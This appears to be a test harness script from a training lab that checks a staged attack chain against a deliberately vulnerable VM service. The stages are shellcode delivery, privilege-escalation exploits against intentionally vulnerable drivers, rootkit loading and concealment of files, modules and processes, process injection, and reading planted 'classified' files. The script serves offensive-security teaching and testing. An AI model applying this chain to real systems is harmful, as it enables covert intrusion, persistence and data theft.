#!/bin/bash
# test_chain.sh — Full COLDSPARK attack chain test
#
# Simulates the end-to-end attack:
#   Stage 1: Beachhead — send shellcode to MERIDIAN, get code exec as analyst
#   Stage 2: LPE — run exploit to get root
#   Stage 3: Deploy — load rootkit (via insmod or reflective loader)
#   Stage 4: Operate — C2, file hide, proc hide, inject, exfil
#
# Each stage can be tested independently:
#   sudo bash test_chain.sh beachhead
#   sudo bash test_chain.sh lpe
#   sudo bash test_chain.sh deploy
#   sudo bash test_chain.sh operate
#   sudo bash test_chain.sh exfil
#   sudo bash test_chain.sh          # all stages
#
# Environment:
#   TARGET=10.10.10.1    Override MERIDIAN IP (default: auto-detect)
#
# When run inside the VM, tests use localhost/systemctl directly.
# When run from the attack host over WireGuard, tests connect to $TARGET.
#
# Requires: MERIDIAN service running, drivers loaded (setup_capstone.sh)

# NO set -e

PASS=0
FAIL=0
SKIP=0
TOTAL=0

pass()  { echo "  PASS: $1"; PASS=$((PASS + 1)); TOTAL=$((TOTAL + 1)); }
fail()  { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); TOTAL=$((TOTAL + 1)); }
skip()  { echo "  SKIP: $1"; SKIP=$((SKIP + 1)); TOTAL=$((TOTAL + 1)); }

# Find artifacts
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
for d in "$(dirname "$SCRIPT_DIR")" "." "/mnt/shared/capstone"; do
    [ -f "$d/rootkit.ko" ] && CAPSTONE_DIR="$d" && break
    [ -f "$d/lkm/rootkit.ko" ] && CAPSTONE_DIR="$d" && break
done
CAPSTONE_DIR="${CAPSTONE_DIR:-.}"

MYKILL=""
for candidate in "$CAPSTONE_DIR/mykill" "$CAPSTONE_DIR/tools/mykill"; do
    [ -x "$candidate" ] && MYKILL="$candidate" && break
done

# ── Target detection ─────────────────────────────────────────────────────────
# Inside VM: use localhost directly (systemctl, insmod, etc.)
# Over WireGuard: use $TARGET IP for network tests (beachhead)

if [ -f /etc/meridian.conf ] || systemctl is-active meridian.service >/dev/null 2>&1; then
    ON_TARGET=true
    MERIDIAN_HOST="localhost"
    MERIDIAN_PORT="1337"
else
    ON_TARGET=false
    MERIDIAN_HOST="${TARGET:-10.10.10.1}"
    MERIDIAN_PORT="${TARGET_PORT:-1337}"
fi

STAGE="${1:-all}"

echo "=== COLDSPARK: Attack Chain Test ==="
if $ON_TARGET; then
    echo "  Mode: on-target (inside VM)"
else
    echo "  Mode: remote (via WireGuard → $MERIDIAN_HOST:$MERIDIAN_PORT)"
fi
echo ""

# ═══════════════════════════════════════════════════════════════════════════════
# Stage 1: Beachhead — Initial code execution via MERIDIAN
# ═══════════════════════════════════════════════════════════════════════════════

run_beachhead_tests() {
    echo "--- Stage 1: Beachhead (MERIDIAN → code exec) ---"

    # Check MERIDIAN is reachable
    if $ON_TARGET; then
        if systemctl is-active meridian.service >/dev/null 2>&1; then
            pass "MERIDIAN service is running"
        else
            fail "MERIDIAN service not running (run setup_capstone.sh)"
            return
        fi
    else
        # Remote: check TCP connectivity
        if timeout 3 bash -c "echo | nc -w2 $MERIDIAN_HOST $MERIDIAN_PORT" 2>/dev/null; then
            pass "MERIDIAN reachable at $MERIDIAN_HOST:$MERIDIAN_PORT"
        else
            fail "Cannot reach MERIDIAN at $MERIDIAN_HOST:$MERIDIAN_PORT (WireGuard up?)"
            return
        fi
    fi

    # Check beachhead shellcode exists
    local BEACHHEAD=""
    for candidate in "$CAPSTONE_DIR/beachhead.bin" "$CAPSTONE_DIR/shellcode/beachhead.bin"; do
        [ -f "$candidate" ] && BEACHHEAD="$candidate" && break
    done

    if [ -z "$BEACHHEAD" ]; then
        skip "No beachhead.bin found (build with: make shellcode)"
        return
    fi

    pass "beachhead.bin found ($(wc -c < "$BEACHHEAD") bytes)"

    # Find send_shellcode.py
    local SENDER=""
    for candidate in "$CAPSTONE_DIR/send_shellcode.py" "$CAPSTONE_DIR/tools/send_shellcode.py"; do
        [ -f "$candidate" ] && SENDER="$candidate" && break
    done

    if [ -z "$SENDER" ]; then
        fail "send_shellcode.py not found"
        return
    fi

    # Send shellcode to MERIDIAN
    if python3 "$SENDER" "$BEACHHEAD" "$MERIDIAN_HOST" "$MERIDIAN_PORT" 2>/dev/null; then
        pass "Shellcode delivered to MERIDIAN ($MERIDIAN_HOST:$MERIDIAN_PORT)"
    else
        fail "Failed to deliver shellcode to MERIDIAN"
    fi

    sleep 2

    # Check MERIDIAN survived (on-target only — can't check systemctl remotely)
    if $ON_TARGET; then
        if systemctl is-active meridian.service >/dev/null 2>&1; then
            pass "MERIDIAN survived shellcode delivery"
        else
            fail "MERIDIAN crashed after shellcode delivery"
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# Stage 2: LPE — Privilege escalation to root
# ═══════════════════════════════════════════════════════════════════════════════

run_lpe_tests() {
    echo ""
    echo "--- Stage 2: Local Privilege Escalation ---"

    # Check drivers
    if [ -c /dev/vuln_rwx ]; then
        pass "/dev/vuln_rwx available"
    else
        skip "/dev/vuln_rwx not loaded"
    fi

    if [ -c /dev/vuln_rw ]; then
        pass "/dev/vuln_rw available"
    else
        skip "/dev/vuln_rw not loaded"
    fi

    # Test each exploit
    local FOUND_EXPLOIT=false
    for exploit in exploit_rwx exploit_privesc exploit_modprobe; do
        local EXPLOIT_PATH=""
        for candidate in "$CAPSTONE_DIR/$exploit" "$CAPSTONE_DIR/exploit/$exploit"; do
            [ -x "$candidate" ] && EXPLOIT_PATH="$candidate" && break
        done

        if [ -z "$EXPLOIT_PATH" ]; then
            skip "$exploit not built"
            continue
        fi

        FOUND_EXPLOIT=true
        pass "$exploit built"

        # Run it (as non-root to test actual escalation)
        echo "  Running $exploit..."
        local OUTPUT
        OUTPUT=$("$EXPLOIT_PATH" 2>&1) || true

        if echo "$OUTPUT" | grep -q "SUCCESS.*uid=0"; then
            pass "$exploit achieved root"
        elif echo "$OUTPUT" | grep -q "not implemented"; then
            skip "$exploit stub (not implemented)"
        else
            fail "$exploit did not achieve root"
            echo "    Output: $(echo "$OUTPUT" | tail -3 | sed 's/^/    /')"
        fi
    done

    if ! $FOUND_EXPLOIT; then
        echo "  No exploits built yet. Add targets to exploit/Makefile."
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# Stage 3: Deploy — Load rootkit
# ═══════════════════════════════════════════════════════════════════════════════

run_deploy_tests() {
    echo ""
    echo "--- Stage 3: Rootkit Deployment ---"

    local ROOTKIT=""
    for candidate in "$CAPSTONE_DIR/rootkit.ko" "$CAPSTONE_DIR/lkm/rootkit.ko"; do
        [ -f "$candidate" ] && ROOTKIT="$candidate" && break
    done

    if [ -z "$ROOTKIT" ]; then
        fail "rootkit.ko not found"
        return
    fi

    pass "rootkit.ko found ($(wc -c < "$ROOTKIT") bytes)"

    # Check if already loaded (test_lkm.sh may have loaded it)
    if lsmod | grep -q rootkit || [ -d /sys/module/rootkit ]; then
        pass "rootkit already loaded"
    else
        dmesg -C
        if insmod "$ROOTKIT" 2>/dev/null; then
            pass "insmod rootkit.ko"
        else
            fail "insmod rootkit.ko failed"
            dmesg | tail -3 | sed 's/^/    /'
            return
        fi
    fi
    sleep 1

    # Test reflective loader if present
    local LOADER=""
    for candidate in "$CAPSTONE_DIR/loader" "$CAPSTONE_DIR/loader/loader"; do
        [ -x "$candidate" ] && LOADER="$candidate" && break
    done

    if [ -n "$LOADER" ]; then
        # Unload first, then test loader path
        rmmod rootkit 2>/dev/null || true
        sleep 1

        echo "  Testing reflective loader..."
        if "$LOADER" "$ROOTKIT" 2>/dev/null; then
            # Verify module is loaded (may not appear in lsmod if loaded reflectively)
            if rkcmd status 2>/dev/null; then
                pass "Reflective loader: rootkit responds to C2"
            else
                fail "Reflective loader: rootkit not responding"
            fi
        else
            fail "Reflective loader failed"
        fi
    else
        skip "Reflective loader not built (optional)"
    fi

    # Leave rootkit loaded for operate tests
}

# ═══════════════════════════════════════════════════════════════════════════════
# Stage 4: Operate — C2, hiding, injection
# ═══════════════════════════════════════════════════════════════════════════════

run_operate_tests() {
    echo ""
    echo "--- Stage 4: Operations (C2 + capabilities) ---"

    # Verify rootkit is loaded
    if ! rkcmd status 2>/dev/null; then
        skip "Rootkit not loaded — run deploy stage first"
        return
    fi

    pass "Rootkit responds to C2 status"

    # File hiding
    echo "hidden_test" > /tmp/rk_optest.txt
    sleep 1
    if ls /tmp | grep -q "rk_optest"; then
        fail "File hiding: rk_optest.txt visible"
    else
        pass "File hiding: rk_optest.txt hidden from ls"
    fi
    rm -f /tmp/rk_optest.txt

    # Module hiding
    if lsmod | grep -q "rootkit"; then
        fail "Module hiding: rootkit visible in lsmod"
    else
        pass "Module hiding: rootkit hidden from lsmod"
    fi

    # Process hiding (requires mykill)
    if [ -n "$MYKILL" ]; then
        sleep 300 &
        local TPID=$!
        sleep 0.5
        "$MYKILL" add-gid "$TPID" 2>/dev/null
        sleep 1

        if ls /proc | grep -q "^${TPID}$"; then
            fail "Process hiding: PID $TPID still visible"
        else
            pass "Process hiding: PID $TPID hidden from /proc"
        fi

        kill $TPID 2>/dev/null; wait $TPID 2>/dev/null || true
    else
        skip "Process hiding: mykill not available"
    fi

    # Injection
    if [ -n "$MYKILL" ]; then
        sleep 300 &
        local IPID=$!
        sleep 0.5
        rm -f /tmp/pwned

        "$MYKILL" inject "$IPID" 2>/dev/null
        sleep 3

        if [ -f /tmp/pwned ]; then
            if grep -q "INJECTED-1337" /tmp/pwned 2>/dev/null; then
                pass "Injection: /tmp/pwned contains INJECTED-1337"
            else
                fail "Injection: /tmp/pwned wrong content"
            fi
        else
            fail "Injection: /tmp/pwned not created"
        fi

        kill $IPID 2>/dev/null; wait $IPID 2>/dev/null || true
        rm -f /tmp/pwned
    else
        skip "Injection: mykill not available"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# Stage 5: Exfil — Read classified files
# ═══════════════════════════════════════════════════════════════════════════════

run_exfil_tests() {
    echo ""
    echo "--- Stage 5: Exfiltration (PIR collection) ---"

    if [ "$(id -u)" -ne 0 ]; then
        skip "Exfil tests require root (run after LPE)"
        return
    fi

    local CLASSIFIED="/home/director/classified"

    if [ ! -d "$CLASSIFIED" ]; then
        skip "Classified directory not found (run setup_capstone.sh)"
        return
    fi

    # PIR-ALPHA
    if grep -q "VIPER-HORNOFAFRICA" "$CLASSIFIED/agents.txt" 2>/dev/null; then
        pass "PIR-ALPHA: agents.txt readable"
    else
        fail "PIR-ALPHA: cannot read agents.txt"
    fi

    # PIR-BRAVO
    if grep -q "ECHO-7-CASPIAN" "$CLASSIFIED/operation_blackbird.txt" 2>/dev/null; then
        pass "PIR-BRAVO: operation_blackbird.txt readable"
    else
        fail "PIR-BRAVO: cannot read operation_blackbird.txt"
    fi

    # PIR-CHARLIE
    if grep -q "K3-CHACHA20-82A1F574" "$CLASSIFIED/crypto_keys.txt" 2>/dev/null; then
        pass "PIR-CHARLIE: crypto_keys.txt readable"
    else
        fail "PIR-CHARLIE: cannot read crypto_keys.txt"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# Dispatch
# ═══════════════════════════════════════════════════════════════════════════════

case "$STAGE" in
    all)
        run_beachhead_tests
        run_lpe_tests
        run_deploy_tests
        run_operate_tests
        run_exfil_tests
        ;;
    beachhead)  run_beachhead_tests ;;
    lpe)        run_lpe_tests ;;
    deploy)     run_deploy_tests ;;
    operate)    run_operate_tests ;;
    exfil)      run_exfil_tests ;;
    *)
        echo "Unknown stage: $STAGE"
        echo "Available: beachhead, lpe, deploy, operate, exfil"
        exit 1
        ;;
esac

# ── Cleanup ──────────────────────────────────────────────────────────────────

echo ""
echo "Cleaning up..."
rkcmd hide-module 2>/dev/null || true
sleep 0.5
rmmod rootkit 2>/dev/null || true

echo ""
echo "=== Results: $PASS passed, $FAIL failed, $SKIP skipped (out of $TOTAL) ==="
exit $FAIL
